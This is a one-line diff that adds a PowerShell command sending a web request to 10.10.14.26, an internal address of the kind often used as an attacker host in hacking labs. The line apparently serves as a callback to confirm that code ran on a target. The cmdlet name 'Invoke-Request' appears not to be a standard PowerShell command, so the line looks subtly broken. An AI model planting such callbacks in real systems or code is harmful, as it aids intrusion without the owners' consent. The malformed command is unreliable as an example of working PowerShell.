@@ -1,0 +1,1 @@
+powershell "Invoke-Request -Uri http://10.10.14.26"
